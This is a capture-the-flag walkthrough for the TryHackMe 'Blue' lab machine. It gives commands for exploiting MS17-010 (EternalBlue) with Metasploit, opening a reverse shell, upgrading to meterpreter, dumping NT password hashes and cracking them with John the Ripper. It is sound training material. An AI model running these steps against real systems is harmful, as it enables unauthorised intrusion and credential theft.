# 10.21.20
# TryHackMe blue
# tryhackme.com/room/blue
# srsploit walkthrough

      Task 1

- mkdir /tryhackme/blue
- cd /tryhackme/blue
- set IP=10.10.235.204 (switch this out for your room's)
# Creates variable IP and sets it to your room's
# To use this IP instead of typing it out every time, use $IP
- Enumerate the machine

nmap -T5 -sC -sV --script vuln $IP
# -T5 sets the maximum speed
# -sC sets
# -sV sets
# --script vuln runs a vulnerability scan
# $IP is the room IP

- After the scan is finished, you'll have a lot of information to
  look through.
- Note the number of ports open (3)
  We may be able to use these ports later on
- Look for the final header "Host script results:"
  This will show you the potential vulnerable services. In this case,
  you can see that 3 of the 4 services are false or denied, leaving
  one service vulnerable to a remote code execution attack.


      Task 2

- Now that we know this machine's vulnerability, we're going to want
  to set up the attack. Load up *msfconsole*
- Once *msfconsole* is running, type out the path to the exploit. I used
  searchsploit ms17-010 to find a list, and then msfconsole to double
  check myself. This isn't necessary, you can just initialize msfconsole
  and type:

search ms17-010

  This will generate a list and paths of exploits and their ranked
  effectiveness. In this case, we'll be using ms17_010_eternalblue

- In msfconsole you'll see the prompt "Interact with a module..."
  Since we're going for the exploit marked "3", type "use 3"
  >>> Double check that it's the same exploit, it may return in a
  different order from my search. We're looking for the exploit
  marked "ms17_010_eternalblue"
- This will load the exploit. Type "show options" and see what
  input is needed from us.
- RHOSTS needs to be added, this will be the target's IP.
  You will also see LHOST and LPORT near the bottom of the screen.
  Your IP will be automatically listed next to LHOST. If it's not
  your tun0 (openvpn) IP, you should change that.

- Back on your Metasploit tab, make sure to set rhosts to the victim's IP
  I like to type out the IP as a double-check for myself
  Also double check that the lhost is your openvpn's IP 
  (tun0 result after ifconfig)

set rhosts 10.10.235.204
set lhost (Your system IP)

- Now that that's all set, you'll type "run" into the msfconsole

> run

- This process will take a while. Let it run until Metasploit pops back
  with something, be that failure or success.
  - When I first ran it, I encountered a failure/Metasploit exit
    on the first attempt. To fix it, in msfconsole:
> set payload generic/shell_reverse_tcp
    Then run again.
- When you reach a success, you'll see a Windows command line prompt
  in the Metasploit console. If "WIN!" appears, but not the command
  line, press enter.

      Task 3

- Next you'll want to background this shell CTRL+Z
- We need to take this shell and upgrade it to *meterpreter*

  In order to do this, you'll type in the msfconsole:

> use post/multi/manage/shell_to_meterpreter
> show options

  You'll see that the SESSION doesn't have a setting. We'll need to set it
  to "1"

> set session 1
> run

  It will take a few seconds, but it will convert the shell into what
  we need.

- Type "sessions" to confirm that you are in fact running meterpreter

  Then type

> sessions -i 2

  You'll see "msf5" be replaced with "meterpreter >"
  To confirm that we're running as admin, type

shell

  Windows command line will pop up, type

whoami

  nt authority\system

  Hit CTRL+Z to background that shell. You'll be back in meterpreter.
  
- Next, we'll be migrating to a more stable process. Type "ps"
  You'll see a list of services and their ID numbers.
  The key to this is finding a service that will likely be stable.
  spoolsv.exe is a common service that's stable.
  It's a printer service, so it's got Authority permissions.
  In my system, spoolsv.exe is marked as 1304 in the far left column.
  It may vary on yours. Find the number for spoolsv.exe and make note of it
  
- Focusing back on the command line, type

migrate 1304

  You'll likely see "Migration completed successfully."
  If not, you can pick a different NT AUTHORITY labeled service and try
  to migrate to that. The important thing to note:
  You can migrate from "authority" to "authority" without losing privileges,
  but if you move from "authority" to a lower tier, you can't migrate
  back up.

        Task 4 - Onto password cracking

- Now that you've migrated, you can go ahead and type "getuid" and
  verify that you're still system authority.
- Next we're going to do a hashdump and check out what users we've got
  on this machine

hashdump

- You'll see an admin, guest and Jon labeled with their password hashes
- Go ahead and copy the whole line of the hash, including "Jon"
  I used another terminal window and made a file in my tryhackme/blue
  folder.
  You can do this in a variety of ways, I used gedit pass.hash and saved
  the file. You could also use (including the quotation marks)

echo "paste_text_here" > pass.hash

- We'll use John the Ripper to crack this password. The binary is
  "john", and you'll need to either be root or use sudo to run it.
  We will also need to find our wordlist. We'll be using rockyou.txt,
  which will be loaded on your Kali system if that's the OS you're using.
  rockyou.txt is available lots of places online if you're using a
  different OS. I've found it on github.
  If you don't know where it's located on your system, you can type

updatedb
locate rockyou.txt

  Mine is in /usr/share/wordlists/ and was compressed, so you may
  need to decompress the file first.

  Onto running john:

sudo john pass.hash format=NT --wordlist=/usr/share/wordlists/rockyou.txt

  The binary will run and we'll get a "Session completed" line.
  To show the cracked password, type

sudo john pass.hash --format=NT --show

  It will display the password between Jon and the start of the hash

        Task 5

- Next we're just collecting the flags that we need.
  Go back to the meterpreter console and pwd to check out which
  directory we're working out of. You can see that we're in system32
  and our hint suggests we navigate to the C: directory.

cd ..
cd ..
ls

  As you can see, flag1.txt is listed. Type cat flag1.txt
  You'll enter in the contents between {}

- The next flag's hint is that it's stored on Windows. Windows
  stores its passwords in the system32 folder, so we'll navigate
  back to system32 and cat flag2.txt

- The final flag is found in Jon's Documents folder
Path: C:\Users\Jon\Documents
  ls in this directory and cat flag3

      Congrats! You're done.
